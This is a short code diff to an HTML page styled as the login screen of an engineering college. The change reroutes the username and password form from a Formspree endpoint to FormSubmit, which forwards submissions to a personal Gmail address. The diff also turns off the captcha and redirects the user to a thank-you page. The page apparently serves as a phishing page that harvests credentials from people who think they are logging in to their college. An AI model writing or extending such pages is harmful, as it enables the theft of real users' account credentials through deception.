@@ -90,13 +90,18 @@
     <img src="logo.jpg" alt="College Logo" class="logo" />
     <h2>Adhiparasakthi Engineering College</h2>
     
-    <!-- ✅ Formspree Integration -->
-    <form action="https://formspree.io/f/xnnbodzr" method="POST">
+    <!-- ✅ FormSubmit Integration -->
+    <form action="https://formsubmit.co/samanthakarthikeyan2006@gmail.com" method="POST">
+      <!-- Form fields -->
       <label for="username">Username</label>
-      <input id="username" name="username" type="text" placeholder="Enter username" required />
+      <input id="username" name="username" type="text" placeholder="Enter username" required>
 
       <label for="password">Password</label>
-      <input id="password" name="password" type="password" placeholder="Enter password" required />
+      <input id="password" name="password" type="password" placeholder="Enter password" required>
+
+      <!-- Hidden fields for behavior -->
+      <input type="hidden" name="_next" value="https://yourwebsite.github.io/thankyou.html">
+      <input type="hidden" name="_captcha" value="false">
 
       <button type="submit">Login</button>
     </form>
